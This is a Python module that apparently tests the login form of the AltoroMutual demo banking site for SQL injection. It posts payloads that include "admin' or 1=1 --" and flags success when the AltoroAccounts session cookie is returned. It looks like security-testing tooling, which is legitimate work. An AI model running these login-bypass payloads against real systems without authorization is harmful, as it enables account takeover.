import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}


payloads = [
    {
        "user": "admin",
        "passw": "test"
    },
    {
        "user": "'",
        "passw": "'"
    },
    {
        "user": "+--",
        "passw": "test"
    },
    {
        "user": "admin' or 1=1 --",
        "passw": "test"
    }
]


class SqlInjection():

    @staticmethod
    def doLoginSqlI(url):
        exit_code = 0
        output = ""
        
        for payload in payloads:
            data = f"uid={payload['user']}&passw={payload['passw']}&btnSubmit=Login"
            response = requests.post(url, headers=headers, data=data, allow_redirects=False)

            if response.status_code == 302:
                if 'Set-Cookie' in response.headers and 'AltoroAccounts' in response.headers['Set-Cookie']:
                    
                    output += f"[!] uid={payload}, SQL injection detected in the login. \n"
                    output += f"\t Set-Cookie received: {response.headers['Set-Cookie']} \n"
                    print(f"[!] uid={payload}, SQL injection detected in the login.")
                    print(f"\t Set-Cookie received: {response.headers['Set-Cookie']}")
                    exit_code += 1
                else:
                    output += f"[*] uid={payload}, Received a {response.status_code}, but the AltoroAccounts cookie was not found. \n"
                    print(f"[*] uid={payload}, Received a {response.status_code}, but the AltoroAccounts cookie was not found.")
            else:
                    output += f"[*] uid={payload}, Redirection {response.status_code} not detected or login failed. \n"
                    print(f"[*] uid={payload}, Redirection {response.status_code} not detected or login failed.")
        return exit_code, output, len(payloads)